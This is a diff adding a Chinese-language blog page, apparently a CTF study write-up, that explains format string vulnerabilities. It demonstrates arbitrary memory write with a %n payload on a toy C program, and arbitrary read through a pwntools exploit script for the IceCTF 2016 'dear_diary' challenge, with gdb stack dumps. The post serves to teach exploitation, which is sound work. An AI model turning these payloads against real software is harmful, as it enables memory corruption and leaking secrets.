@@ -1,0 +1,1040 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.2"/>
+
+
+
+
+  <meta name="keywords" content="格式化字符串漏洞，icectf，dear_diary," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Edward_L's Blog" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.2" />
+
+
+
+
+  <title> 格式化字符串漏洞 // Edward_L's Blog </title>
+</head>
+
+<body>
+<!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Edward_L's Blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+
+  <ul id="menu" class="menu">
+    
+    
+      
+      <li class="menu-item menu-item-home">
+        <a href="/">
+          <i class="menu-item-icon icon-home"></i> <br />
+          Home
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-categories">
+        <a href="/categories">
+          <i class="menu-item-icon icon-categories"></i> <br />
+          Categories
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-archives">
+        <a href="/archives">
+          <i class="menu-item-icon icon-archives"></i> <br />
+          Archives
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-tags">
+        <a href="/tags">
+          <i class="menu-item-icon icon-tags"></i> <br />
+          Tags
+        </a>
+      </li>
+    
+      
+      <li class="menu-item menu-item-about">
+        <a href="/about-me">
+          <i class="menu-item-icon icon-about"></i> <br />
+          About
+        </a>
+      </li>
+    
+  </ul>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              格式化字符串漏洞
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          Posted on 2016-09-01
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; In
+            
+              <a href="/categories/binary/">binary</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/09/01/格式化字符串漏洞/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/01/格式化字符串漏洞/"></span>
+            </a>
+          </span>
+          
+        
+
+        
+&nbsp; | &nbsp;
+<span id="/2016/09/01/格式化字符串漏洞/"class="leancloud_visitors" data-flag-title="格式化字符串漏洞">
+         &nbsp;Views
+        </span>
+
+
+
+      </div>
+    </div>
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h2 id="任意地址写">任意地址写</h2><p>学习了<a href="http://libc.pw/2015/07/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">z神的博客</a>之后对最后一个例子不是很理解，就进行了实践分析。<br>源程序<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123; </span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *p = &amp;flag; </span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(a);</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">2000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"good!!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>我们的目标是最后输出good！也就是说我们要改变flag的值。我们可以改变指向flag的指针p，来达到我们的目的。<br>首先我们需要知道我们现在读的位置，随手读取8个字节，我们可以看见结果如下，输出的8个字节为ffffce380000<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ <span class="literal">r</span></span><br><span class="line">Starting <span class="keyword">program</span>: /home/<span class="keyword">ed</span>/Desktop/pwn/<span class="keyword">test</span>/<span class="keyword">test</span> </span><br><span class="line">%04x%04x</span><br><span class="line">ffffce380000[Inferior 1 (process 36916) exited normally]</span><br></pre></td></tr></table></figure></p>
+<p>查看此时的栈<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /30w $<span class="literal">esp</span></span><br><span class="line"><span class="number">0xffffce20</span>:	<span class="number">0xffffce38</span>	<span class="number">0xffffce38</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffce30</span>:	<span class="number">0x00000000</span>	<span class="number">0xffffce30</span>	<span class="number">0x30313025</span>	<span class="number">0x31302578</span></span><br><span class="line"><span class="number">0xffffce40</span>:	<span class="number">0x30257830</span>	<span class="number">0x30253031</span>	<span class="number">0x30373931</span>	<span class="number">0x006e2578</span></span><br><span class="line"><span class="number">0xffffce50</span>:	<span class="number">0xf7ffd938</span>	<span class="number">0x00000000</span>	<span class="number">0x000000c2</span>	<span class="number">0xf7ea9716</span></span><br><span class="line"><span class="number">0xffffce60</span>:	<span class="number">0xffffffff</span>	<span class="number">0xffffce8e</span>	<span class="number">0xf7e21c34</span>	<span class="number">0xf7e47fe3</span></span><br><span class="line"><span class="number">0xffffce70</span>:	<span class="number">0x00000000</span>	<span class="number">0x00ca0000</span>	<span class="number">0x00000001</span>	<span class="number">0x000000c2</span></span><br><span class="line"><span class="number">0xffffce80</span>:	<span class="number">0xffffd167</span>	<span class="number">0x0000002f</span>	<span class="number">0x0fabfbff</span>	<span class="number">0x0804858b</span></span><br><span class="line"><span class="number">0xffffce90</span>:	<span class="number">0x00000001</span>	<span class="number">0xffffcf54</span></span><br></pre></td></tr></table></figure></p>
+<p>我们可以发现此时的esp为<strong>0xffffce20</strong>，他是从esp+4开始打印的，接下来只要算出<em>p到开始答应的偏移地址我们就可以构造出payload，实现对flag的修改。<br>接下来我们去查看</em>p的位置<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x80484fb</span> &lt;main+<span class="number">64</span>&gt;:	<span class="keyword">lea</span>    <span class="number">eax</span>,[<span class="literal">ebp</span>-<span class="number">0x70</span>]</span><br><span class="line">   <span class="number">0x80484fe</span> &lt;main+<span class="number">67</span>&gt;:	<span class="keyword">push</span>   <span class="number">eax</span></span><br><span class="line">=&gt; <span class="number">0x80484ff</span> &lt;main+<span class="number">68</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048370</span> &lt;printf@plt&gt;</span><br><span class="line">   <span class="number">0x8048504</span> &lt;main+<span class="number">73</span>&gt;:	<span class="keyword">add</span>    <span class="literal">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x8048507</span> &lt;main+<span class="number">76</span>&gt;:	<span class="keyword">mov</span>    <span class="number">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>-<span class="number">0x78</span>]</span><br><span class="line">   <span class="number">0x804850a</span> &lt;main+<span class="number">79</span>&gt;:	<span class="keyword">cmp</span>    <span class="number">eax</span>,<span class="number">0x7d0</span></span><br></pre></td></tr></table></figure></p>
+<p>注意观察0x8048507 <main+76>，我们可以发现 <em>P的位置是DWORD PTR [ebp-0x78]<br>我们可以看到现在p在栈中的位置是**</em>0xffffce30<em>*</em>。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda<span class="variable">$ </span>x /w <span class="variable">$ebp</span>-<span class="number">0x78</span></span><br><span class="line"><span class="number">0xffffce30</span><span class="symbol">:</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure></main+76></p>
+<p>这样我们就可以构造payload，（0xffffce30-0xffffce20）/4我们只要构造出%010x%010x%010x%1970x%n就可以成功的把2000写入flag。<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ed</span>-machine:/home/ed/Desktop/pwn/test# ./test</span><br><span class="line"><span class="variable">%010x</span><span class="variable">%010x</span><span class="variable">%010x</span><span class="variable">%01970x</span><span class="variable">%n</span></span><br><span class="line"><span class="number">00</span>ffffce780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ok!</span><br></pre></td></tr></table></figure></p>
+<h2 id="任意地址读">任意地址读</h2><p>这个我们可以借助2016 icectf的dear_diary这个题来理解<br>这个题的大致解题思路是这样的，首先把存在data中的flag的地址找到，并在第一次选择中选1.把这个地址写入。然后第二次选择还是选1，写入我们的payload，第三次选择中选2，把flag打印出来。<br>首先我们要找到falg在data中的地址，这个可以通过ida分析得到<strong><em>0x0804a0a0</em></strong>，然后我们要知道打印时esp的位置，和第一次写的位置，通过这两个地址我们就可以计算出偏移从而构造payload。要知道打印时的esp可以通过gdb在print这个地方下断点，查看esp的值,我们可以发现esp的值为<strong><em>0xffffba50</em></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line"><span class="number">EAX</span>: <span class="number">0xffffbb98</span> (<span class="string">"bbbb\n"</span>)</span><br><span class="line"><span class="number">EBX</span>: <span class="number">0xf7fbc000</span> --&gt; <span class="number">0x1a6da8</span> </span><br><span class="line"><span class="number">ECX</span>: <span class="number">0xa</span> (<span class="string">'\n'</span>)</span><br><span class="line"><span class="number">EDX</span>: <span class="number">0x100</span> </span><br><span class="line"><span class="label">ESI:</span> <span class="number">0x0</span> </span><br><span class="line"><span class="label">EDI:</span> <span class="number">0x0</span> </span><br><span class="line"><span class="label">EBP:</span> <span class="number">0xffffba78</span> --&gt; <span class="number">0xffffcea8</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="label">ESP:</span> <span class="number">0xffffba50</span> --&gt; <span class="number">0xffffbb98</span> (<span class="string">"bbbb\n"</span>)</span><br><span class="line"><span class="label">EIP:</span> <span class="number">0x804873e</span> (&lt;print_entry+<span class="number">29</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048490</span> &lt;printf@plt&gt;)</span><br><span class="line"><span class="label">EFLAGS:</span> <span class="number">0x246</span> (carry PARITY adjust <span class="preprocessor">ZERO</span> sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x8048736</span> &lt;print_entry+<span class="number">21</span>&gt;:	<span class="keyword">xor</span>    <span class="number">eax</span>,<span class="number">eax</span></span><br><span class="line">   <span class="number">0x8048738</span> &lt;print_entry+<span class="number">23</span>&gt;:	<span class="keyword">mov</span>    <span class="number">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>-<span class="number">0x1c</span>]</span><br><span class="line">   <span class="number">0x804873b</span> &lt;print_entry+<span class="number">26</span>&gt;:	<span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">esp</span>],<span class="number">eax</span></span><br><span class="line">=&gt; <span class="number">0x804873e</span> &lt;print_entry+<span class="number">29</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048490</span> &lt;printf@plt&gt;</span><br><span class="line">   <span class="number">0x8048743</span> &lt;print_entry+<span class="number">34</span>&gt;:	<span class="keyword">mov</span>    <span class="number">eax</span>,<span class="literal">ds</span>:<span class="number">0x804a080</span></span><br><span class="line">   <span class="number">0x8048748</span> &lt;print_entry+<span class="number">39</span>&gt;:	<span class="keyword">mov</span>    <span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">esp</span>],<span class="number">eax</span></span><br><span class="line">   <span class="number">0x804874b</span> &lt;print_entry+<span class="number">42</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484a0</span> &lt;fflush@plt&gt;</span><br><span class="line">   <span class="number">0x8048750</span> &lt;print_entry+<span class="number">47</span>&gt;:	<span class="keyword">mov</span>    <span class="number">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[<span class="number">0</span>]: <span class="number">0xffffbb98</span> (<span class="string">"bbbb\n"</span>)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0xffffba50</span> --&gt; <span class="number">0xffffbb98</span> (<span class="string">"bbbb\n"</span>)</span><br><span class="line"><span class="number">0004</span>| <span class="number">0xffffba54</span> --&gt; <span class="number">0xf7e49316</span> (&lt;strtol+<span class="number">6</span>&gt;:	<span class="keyword">add</span>    <span class="number">ebx</span>,<span class="number">0x172cea</span>)</span><br><span class="line"><span class="number">0008</span>| <span class="number">0xffffba58</span> --&gt; <span class="number">0xf7fbc000</span> --&gt; <span class="number">0x1a6da8</span> </span><br><span class="line"><span class="number">0012</span>| <span class="number">0xffffba5c</span> --&gt; <span class="number">0xffffbb98</span> (<span class="string">"bbbb\n"</span>)</span><br><span class="line"><span class="number">0016</span>| <span class="number">0xffffba60</span> --&gt; <span class="number">0xffffce98</span> --&gt; <span class="number">0x8000a32</span> </span><br><span class="line"><span class="number">0020</span>| <span class="number">0xffffba64</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0024</span>| <span class="number">0xffffba68</span> --&gt; <span class="number">0xa</span> (<span class="string">'\n'</span>)</span><br><span class="line"><span class="number">0028</span>| <span class="number">0xffffba6c</span> --&gt; <span class="number">0x59573600</span> (<span class="string">'')</span><br><span class="line">[------------------------------------------------------------------------------]</span></span><br></pre></td></tr></table></figure></p>
+<p>查看栈的情况，我们可以找到第一次写入的位置为<strong><em>0xffffba98</em></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /20xw $<span class="literal">esp</span></span><br><span class="line"><span class="number">0xffffba80</span>:	<span class="number">0xffffbc98</span>	<span class="number">0x00000004</span>	<span class="number">0xf7fbcc20</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffba90</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000003</span>	<span class="number">0x61616161</span>	<span class="number">0x0000000a</span></span><br><span class="line"><span class="number">0xffffbaa0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来就可以构造完整的payload了。下面是我的脚本<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="reserved">import</span> *</span><br><span class="line">choise1 = <span class="string">"1"</span></span><br><span class="line">choise2 = <span class="string">"2"</span></span><br><span class="line">choise3 = <span class="string">"3"</span></span><br><span class="line"></span><br><span class="line">t = process(<span class="string">"./dear_diary"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> t.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">#### choise1 ###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">###</span><br><span class="line">print choise1</span><br><span class="line">t.sendline(choise1)</span><br><span class="line">print t.recvuntil(":")</span><br><span class="line">payload = 0x0804a0a0</span><br><span class="line">print p32(payload)</span><br><span class="line">t.sendline(p32(payload))</span><br><span class="line">print t.recvuntil("&gt;")</span><br><span class="line"></span><br><span class="line">###</span><span class="comment">######</span><span class="comment">##choise2 ################</span></span><br><span class="line"><span class="built_in">print</span> choise2</span><br><span class="line">t.sendline(choise2)</span><br><span class="line"><span class="built_in">print</span> t.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">####choise1 ###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">##</span></span><br><span class="line"><span class="built_in">print</span> choise1</span><br><span class="line">t.sendline(choise1)</span><br><span class="line"><span class="built_in">print</span> t.recvuntil(<span class="string">":"</span>)</span><br><span class="line">addr1 = <span class="number">0xffffba50</span></span><br><span class="line">addr2 = <span class="number">0xffffba98</span></span><br><span class="line">p = (addr2-addr1)/<span class="number">4</span>-<span class="number">1</span></span><br><span class="line">payload = <span class="string">"%08x"</span>*p+<span class="string">"%s"</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">t.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> t.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">###choise2###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">##</span></span><br><span class="line"><span class="built_in">print</span> choise2</span><br><span class="line">t.sendline(choise2)</span><br><span class="line"><span class="built_in">print</span> t.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span><span class="comment">####choise3###</span><span class="comment">######</span><span class="comment">#####</span><br><span class="line">print choise3</span><br><span class="line">t.sendline(choise3)</span></span><br></pre></td></tr></table></figure></p>
+
+      
+
+
+
+
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/格式化字符串漏洞，icectf，dear-diary/"> #格式化字符串漏洞，icectf，dear_diary </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/08/18/c是怎么使用内存的/">c是怎么使用内存的</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/09/01/格式化字符串漏洞/"
+               data-title="格式化字符串漏洞" data-url="http://edward-l.github.io/2016/09/01/格式化字符串漏洞/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="http://edwardl.qiniudn.com/psb.jpeg" alt="Edward_L" />
+          <p class="site-author-name">Edward_L</p>
+        </div>
+        <p class="site-description motion-element"></p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">51</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">categories</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">60</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml">
+              <i class="menu-item-icon icon-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/Edward-L" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://weibo.com/Edward7L" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://www.zhihu.com/people/lin-zhe-xi" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+
+
+    <!--增加swiftype搜索功能-->
+    <form class="menu-item menu-item-search">
+      <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+    </form>
+    
+    <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+      _st('install','HxJvJ6xstU7NZbDoyPPn','2.0.0');
+    </script>
+    <!--增加swiftype搜索功能end-->           	   
+    
+	</div>      
+
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#任意地址写"><span class="nav-number">1.</span> <span class="nav-text">任意地址写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意地址读"><span class="nav-number">2.</span> <span class="nav-text">任意地址读</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright">
+  
+  &copy; &nbsp;  2014 - 
+  2016
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Edward_L</span>
+
+<span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+
+<span id="busuanzi_container_site_pv">
+   Total <span id="busuanzi_value_site_pv"></span> views
+</span>
+
+<span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  
+<span id="busuanzi_container_site_uv">
+    Unique Visitors:<span id="busuanzi_value_site_uv"></span>   
+</span>
+
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+
+  <script type="text/javascript">
+  function hasMobileUA () {
+    var nav = window.navigator;
+    var ua = nav.userAgent;
+    var pa = /iPad|iPhone|Android|Opera Mini|BlackBerry|webOS|UCWEB|Blazer|PSP|IEMobile|Symbian/g;
+
+    return pa.test(ua);
+  }
+
+  function isDesktop () {
+    return screen.width > 991 && !hasMobileUA();
+  }
+
+  function isTablet () {
+    return screen.width < 992 && screen.width > 767 && hasMobileUA();
+  }
+
+  function isMobile () {
+    return screen.width < 767 && hasMobileUA();
+  }
+
+  function escapeSelector (selector) {
+    return selector.replace(/[!"$%&'()*+,.\/:;<=>?@[\\\]^`{|}~]/g, "\\$&")
+  }
+
+  function displaySidebar () {
+    setTimeout(function () {
+      $('.sidebar-toggle').trigger('click');
+    }, 800);
+  }
+</script>
+
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" id="motion.global">
+  $(document).ready(function () {
+    var body = $('body');
+    var isSidebarVisible = false;
+    var sidebarToggle = $('.sidebar-toggle');
+    var sidebarToggleLine1st = $('.sidebar-toggle-line-first')
+    var sidebarToggleLine2nd = $('.sidebar-toggle-line-middle');
+    var sidebarToggleLine3rd = $('.sidebar-toggle-line-last');
+    var sidebar = $('.sidebar');
+
+    var SIDEBAR_WIDTH = '320px';
+    var SIDEBAR_DISPLAY_DURATION = 300;
+
+    var sidebarToogleLineStatusInit = {width: '100%', opacity: 1, left: 0, rotateZ: 0, top: 0};
+
+    var sidebarToggleLine1stStatusInit = sidebarToogleLineStatusInit;
+    var sidebarToggleLine1stStatusArrow = {width: '50%', rotateZ: '-45deg', top: '2px'};
+    var sidebarToogleLine1stStatusClose = {width: '100%', rotateZ: '-45deg', top: '5px'};
+
+    var sidebarToggleLine2ndStatusInit = sidebarToogleLineStatusInit;
+    var sidebarToggleLine2ndStatusArrow = {width: '90%'};
+    var sidebarToogleLine2ndStatusClose = {opacity: 0};
+
+    var sidebarToggleLine3rdStatusInit = sidebarToogleLineStatusInit;
